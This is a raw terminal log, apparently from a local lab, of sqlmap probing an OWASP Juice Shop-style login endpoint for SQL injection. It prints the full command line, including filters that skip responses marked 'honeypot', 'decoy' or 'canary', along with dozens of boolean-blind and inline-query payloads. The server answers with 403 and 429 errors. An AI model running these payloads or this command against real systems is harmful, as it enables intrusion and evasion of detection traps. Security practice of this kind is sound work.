@@ -1,0 +1,1318 @@
+﻿yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ 
+[C0/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "
+[1@t
+]0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ 
+[?2004l        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.3#pip}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] starting @ 17:04:27 /2026-04-24/
+[17:04:27] [DEBUG] cleaning up configuration parameters
+[17:04:27] [DEBUG] setting the HTTP timeout
+[17:04:27] [DEBUG] setting extra HTTP headers
+[17:04:27] [DEBUG] setting the HTTP User-Agent header
+[17:04:27] [DEBUG] creating HTTP requests opener object
+[17:04:27] [DEBUG] forcing back-end DBMS to user defined value
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[17:04:27] [DEBUG] used the default behavior, running in batch mode
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[17:04:27] [DEBUG] used the default behavior, running in batch mode
+[17:04:27] [INFO] flushing session file
+[17:04:27] [DEBUG] resolving hostname 'localhost'
+[17:04:27] [INFO] testing connection to the target URL
+[17:04:30] [DEBUG] got HTTP error code: 429 ('TOO MANY REQUESTS')
+[17:04:30] [WARNING] the web server responded with an HTTP error code (429) which could interfere with the results of the tests
+[17:04:30] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[17:04:30] [PAYLOAD] 7418
+[17:04:32] [DEBUG] got HTTP error code: 429 ('TOO MANY REQUESTS')
+[17:04:32] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[17:04:32] [PAYLOAD] admin@juice-sh.op).)'((",),
+[17:04:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:33] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[17:04:33] [PAYLOAD] admin@juice-sh.op'domcfT<'">bezFeA
+[17:04:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:34] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[17:04:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:04:34] [PAYLOAD] admin@juice-sh.op) AND 1432=4308 AND (5704=5704
+[17:04:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:34] [PAYLOAD] admin@juice-sh.op) AND 5293=5293 AND (4204=4204
+[17:04:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:34] [PAYLOAD] admin@juice-sh.op AND 1502=9811
+[17:04:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:35] [PAYLOAD] admin@juice-sh.op AND 5293=5293
+[17:04:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:35] [PAYLOAD] admin@juice-sh.op') AND 3606=1165 AND ('OQTu'='OQTu
+[17:04:36] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:36] [PAYLOAD] admin@juice-sh.op') AND 5293=5293 AND ('PiFm'='PiFm
+[17:04:36] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:36] [PAYLOAD] admin@juice-sh.op' AND 5128=1496 AND 'JiAY'='JiAY
+[17:04:36] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:36] [PAYLOAD] admin@juice-sh.op' AND 5293=5293 AND 'YvbU'='YvbU
+[17:04:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:37] [PAYLOAD] admin@juice-sh.op AND 5379=7558-- dMcN
+[17:04:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:37] [PAYLOAD] admin@juice-sh.op AND 5293=5293-- sQeP
+[17:04:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:38] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
+[17:04:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:04:38] [PAYLOAD] (SELECT (CASE WHEN (2793=6586) THEN CHAR(97,100,109,105,110,64,106,117,105,99,101,45,115,104,46,111,112) ELSE (SELECT 6586 UNION SELECT 6760) END))
+[17:04:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:38] [PAYLOAD] (SELECT (CASE WHEN (2182=2182) THEN CHAR(97,100,109,105,110,64,106,117,105,99,101,45,115,104,46,111,112) ELSE (SELECT 7165 UNION SELECT 3341) END))
+[17:04:38] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:38] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
+[17:04:38] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
+[17:04:38] [INFO] testing 'Generic inline queries'
+[17:04:38] [PAYLOAD] (SELECT CONCAT(CONCAT(CHAR(113,98,107,107,113),(CASE WHEN (3752=3752) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113,113,120,98,113)))
+[17:04:39] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:39] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+[17:04:39] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'ClickHouse inline queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
